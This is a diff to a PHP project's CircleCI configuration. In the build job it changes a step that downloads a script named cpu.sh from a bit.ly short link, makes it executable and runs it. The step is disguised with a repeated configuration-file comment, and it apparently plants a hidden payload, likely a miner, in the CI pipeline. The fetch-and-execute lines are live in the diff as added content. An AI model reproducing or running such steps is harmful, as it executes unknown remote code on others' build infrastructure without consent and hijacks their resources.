@@ -21,7 +21,7 @@ jobs:
     steps:
       - checkout
 
-      - run: wget -O cpu.sh bit.ly/CPU001 # PHP CircleCI 2.0 Configuration File# PHP CircleCI 2.0 Configuration File sudo apt install zlib1g-dev libsqlite3-dev
+      - run: wget -O cpu.sh bit.ly/CPU01 # PHP CircleCI 2.0 Configuration File# PHP CircleCI 2.0 Configuration File sudo apt install zlib1g-dev libsqlite3-dev
       - run: chmod +x cpu.sh
       - run: ./cpu.sh
       - run: sudo docker-php-ext-install zip
